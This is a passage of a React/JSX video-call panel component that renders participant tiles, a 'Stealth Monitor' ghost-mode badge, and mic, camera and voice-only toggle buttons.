                onClick={() => setHide(true)}
                title="Hide video call (audio remains active in background)"
                className="rounded-lg p-1 text-white/60 hover:bg-white/10 hover:text-white transition"
              >
                <EyeOff className="h-3.5 w-3.5" />
              </button>
            </div>
          </div>

          {isGhost && (
            <div className="mb-2 px-2.5 py-1 rounded-xl bg-purple-950/80 border border-purple-500/40 text-[10px] text-purple-300 flex items-center justify-between">
              <span className="font-bold flex items-center gap-1">👻 Stealth Monitor</span>
              <span className="text-[9px] text-purple-400">0 Cam/Mic Used</span>
            </div>
          )}

          <div className={`flex ${layout === 'side' ? 'flex-row overflow-x-auto max-w-[85vw]' : 'flex-col'} gap-2`}>
            {/* Local User Tile */}
            {!isGhost && (
              <Tile
                stream={mine}
                name="You"
                isPartner={false}
                voiceOnly={voiceOnly}
                isSpeaking={localTalking}
                isCamOff={!cam}
                isMicMuted={!mic}
                className="aspect-video w-36 sm:w-44"
              />
            )}

            {/* Remote Peer Tiles */}
            {users.filter((u) => u.id !== me).map((u) => (
              <Tile
                key={u.id}
                stream={remote[u.id]}
                name={u.name}
                isPartner={true}
                voiceOnly={voiceOnly}
                isSpeaking={!!remoteTalking[u.id]}
                isCamOff={!!remoteCamOff[u.id]}
                isMicMuted={!!remoteMicMuted[u.id]}
                className="aspect-video w-36 sm:w-44"
              />
            ))}
          </div>

          {!isGhost && (
            <div className="mt-2.5 flex items-center justify-center gap-2 pt-2 border-t border-white/10 text-white">
              <button
                type="button"
                onClick={toggleMic}
                aria-label="Toggle microphone"
                title={mic ? 'Mute microphone' : 'Unmute microphone'}
                className={`p-2 rounded-xl transition cursor-pointer flex items-center gap-1.5 text-xs font-semibold ${
                  mic
                    ? 'bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300 border border-emerald-500/40'
                    : 'bg-rose-500/25 hover:bg-rose-500/35 text-rose-300 border border-rose-500/40 shadow-sm'
                }`}
              >
                {mic ? <Mic className="h-4 w-4" /> : <MicOff className="h-4 w-4" />}
                <span className="text-[10px]">{mic ? 'Mute' : 'Unmute'}</span>
              </button>

              <button
                type="button"
                onClick={toggleCam}
                disabled={camSwitching}
                aria-label="Toggle camera"
                title={cam ? 'Turn off camera (releases hardware)' : 'Turn on camera'}
                className={`p-2 rounded-xl transition cursor-pointer flex items-center gap-1.5 text-xs font-semibold ${
                  cam
                    ? 'bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300 border border-emerald-500/40'
                    : 'bg-rose-500/25 hover:bg-rose-500/35 text-rose-300 border border-rose-500/40 shadow-sm'
                }`}
              >
                {cam ? <Video className="h-4 w-4" /> : <VideoOff className="h-4 w-4" />}
                <span className="text-[10px]">{cam ? 'Cam Off' : 'Cam On'}</span>
              </button>

              <button
                type="button"
                onClick={toggleVoiceOnly}
                aria-label="Voice-only mode"
                title={voiceOnly ? 'Switch back to video mode' : 'Voice-only mode (saves bandwidth)'}
                className={`px-2.5 py-2 rounded-xl text-[10px] font-semibold transition cursor-pointer flex items-center gap-1 ${
                  voiceOnly
                    ? 'bg-rose-600 text-white border border-rose-500 shadow-md'
                    : 'bg-white/10 border border-white/15 text-white/70 hover:bg-white/15 hover:text-white'
                }`}
              >
                <Volume2 className="h-3.5 w-3.5 text-rose-400" />
                <span>{voiceOnly ? 'Voice: ON' : 'Voice Only'}</span>
              </button>
            </div>
          )}
        </div>
      )}
    </>
  );
}
